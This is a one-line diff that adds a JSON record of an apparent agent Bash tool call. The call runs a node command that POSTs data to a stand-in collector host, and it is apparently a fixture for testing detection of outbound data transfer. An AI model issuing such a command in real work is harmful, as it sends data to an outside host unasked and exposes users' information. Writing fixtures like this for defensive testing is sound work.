@@ -1,0 +1,1 @@
+{"tool_name":"Bash","tool_input":{"command":"node -e \"fetch('https://collector.example.net/x',{method:'POST',body:'d'})\""}}
